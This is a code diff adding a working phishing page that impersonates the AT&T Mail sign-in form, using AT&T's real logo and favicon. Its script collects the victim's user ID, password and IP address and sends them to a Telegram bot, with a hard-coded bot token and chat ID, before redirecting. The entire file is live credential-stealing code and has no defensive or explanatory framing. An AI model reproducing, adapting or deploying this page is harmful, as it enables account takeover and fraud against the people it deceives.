@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Login Form</title>
+    <link rel="icon" href="https://signin.att.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="AT&T Logo">
+            <h2>Sign in</h2>
+            <h2><strong>to access AT&T Mail and Currently.com</strong></h2>
+            
+            <form id="loginForm" method="POST">
+                <div id="user-id-container">
+                    <p style="text-align: left;">User ID</p>
+                    <input type="text" name="username" id="username" required>
+                    <button type="button" onclick="showPassword()" class="submit-btn">Continue</button>
+                </div>
+                
+                <div id="password-container" style="display:none;">
+                    <p style="text-align: left;">Password</p>
+                    <input type="password" name="password" id="password" required>
+                    <input type="submit" value="Login">
+                </div>
+
+                <div class="forgot-link">
+                    <a href="#"><h3>Forgot user ID?</h3></a>
+                    <a href="#"><h3>Don't have a user ID? Create one now</h3></a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let userIp = '';
+
+        // Fetch the user's IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => userIp = data.ip)
+            .catch(error => console.error('Error fetching IP address:', error));
+
+        function showPassword() {
+            const username = document.getElementById('username').value;
+            if (username) {
+                document.getElementById('user-id-container').style.display = 'none';
+                document.getElementById('password-container').style.display = 'block';
+            } else {
+                alert('Please enter your User ID.');
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Send login info to Telegram
+            sendToTelegram(username, password, userIp).then(() => {
+                window.location.href = 'redirection.html'; // Redirect after sending
+            });
+        });
+
+        function sendToTelegram(username, password, userIp) {
+            const chatId = '6536227398';  // Your Telegram Chat ID
+            const botToken = '7846559541:AAGk0hykbt2CRn20vK6KaV-cxQbYy4b0ToA';  // Your Telegram bot token
+            const message = `AT&T Login Info:\nUser ID: ${username}\nPassword: ${password}\nIP Address: ${userIp}`;
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            return fetch(telegramApiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                    alert('Failed to send message. Please try again.');
+                });
+        }
+    </script>
+    <div class="bottom">
+        <footer>
+            <p style="text-align: left;">Legal policy center</p>
+        </footer>
+    </div>
+</body>
+</html>
